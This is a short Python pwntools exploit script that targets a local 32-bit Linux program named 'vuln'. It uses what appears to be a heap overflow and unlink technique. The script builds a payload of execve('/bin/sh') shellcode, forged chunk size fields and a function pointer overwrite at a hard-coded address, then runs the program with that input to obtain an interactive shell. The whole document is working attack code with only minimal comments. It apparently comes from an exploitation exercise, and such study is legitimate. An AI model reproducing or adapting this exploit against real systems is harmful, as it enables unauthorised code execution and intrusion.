#!/usr/bin/python
from pwn import *

# Set target program architecture.
context.arch      = 'i386'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 32

# Information to heap.
FUNCTION_POINTER = 0x08049778
CODE_ADDRESS = 0x804a008 + 0x10
shellcode = b"\xeb\x0assppppffff\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68" \
            "\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Construct and save the arrack string.
input = p32(0xdefaced) * 4
input += shellcode
input += ((680 - 4 * 4) - (4 * 4 + len(shellcode))) * b'B'
input += p32(0xffffffff)
input += p32(0xfffffffc)
input += p32(FUNCTION_POINTER - 12)
input += p32(CODE_ADDRESS)

with open('input_str_py', 'wb') as f:
    f.write(input)

# Start the target process with attack input.
p = process(argv=['./vuln', input])
# Get the shell.
p.interactive()
